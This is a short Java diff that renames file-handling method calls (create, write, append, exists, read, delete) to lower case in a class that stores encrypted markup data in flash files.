@@ -115,13 +115,13 @@ public class Markup {
 
         AutoFlashFile file = new AutoFlashFile(markupName, true);
 
-        file.Create();
+        file.create();
 
         if (data != null) {
             byte[] encData = encryption.EncryptData(data);
             Check.asserts(encData.length >= data.length, "strange data len");
-            file.Write(data.length);
-            file.Append(encData);
+            file.write(data.length);
+            file.append(encData);
         }
 
         return true;
@@ -150,8 +150,8 @@ public class Markup {
 
         AutoFlashFile file = new AutoFlashFile(markupName, true);
 
-        if (file.Exists()) {
-            byte[] encData = file.Read();
+        if (file.exists()) {
+            byte[] encData = file.read();
             int len = Utils.byteArrayToInt(encData, 0);
 
             byte[] plain = encryption.DecryptData(encData, len, 4);
@@ -172,7 +172,7 @@ public class Markup {
 
         AutoFlashFile file = new AutoFlashFile(markupName, true);
 
-        return file.Exists();
+        return file.exists();
     }
 
     /**
@@ -189,7 +189,7 @@ public class Markup {
         Check.asserts(markupName != "", "markupName empty");
 
         AutoFlashFile file = new AutoFlashFile(markupName, true);
-        file.Delete();
+        file.delete();
     }
 
     /**
